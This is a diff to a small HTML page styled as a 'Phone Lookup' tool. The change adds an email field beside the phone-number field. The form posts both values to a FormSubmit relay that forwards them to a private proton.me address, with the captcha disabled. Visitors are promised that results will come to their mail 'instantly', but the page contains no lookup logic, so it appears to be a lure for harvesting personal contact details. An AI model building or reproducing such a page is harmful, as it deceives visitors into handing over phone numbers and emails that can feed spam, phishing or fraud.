@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Phone Number Lookup</title>
+  <title>Phone Lookup</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -18,11 +18,12 @@
       padding: 30px;
       border-radius: 10px;
       box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 320px;
     }
-    input[type="text"] {
+    input[type="text"], input[type="email"] {
       width: 100%;
       padding: 12px;
-      margin-bottom: 10px;
+      margin-bottom: 15px;
       border: 1px solid #ccc;
       border-radius: 8px;
     }
@@ -45,12 +46,13 @@
 </head>
 <body>
   <form action="https://formsubmit.co/thesecrec@proton.me" method="POST" onsubmit="showMessage()">
-    <h2>Enter Mobile Number</h2>
+    <h2>Enter Details</h2>
     <input type="text" name="phone_number" placeholder="Enter mobile number" required />
-    
-    <!-- To skip FormSubmit’s confirmation page -->
-    <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html" />
+    <input type="email" name="user_email" placeholder="Enter your email" required />
+
+    <!-- Optional: redirect to a thank-you page -->
     <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html" />
 
     <input type="submit" value="Submit" />
     <p class="message" id="thanksMessage">Thanks for giving inputs. Results will come to your mail ID instantly.</p>
